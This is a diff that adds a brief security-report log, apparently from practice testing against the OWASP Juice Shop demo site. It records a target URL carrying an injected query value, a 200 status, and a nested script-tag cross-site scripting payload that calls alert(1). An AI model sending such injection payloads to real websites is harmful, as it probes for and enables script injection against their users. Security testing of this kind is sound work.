@@ -1,0 +1,6 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=<script data-info='init'><!--<script>alert(1)<
+
+[STATUS]: 200
+[PAYLOAD]: <script data-info='init'><!--<script>alert(1)</script>--></script>
+---
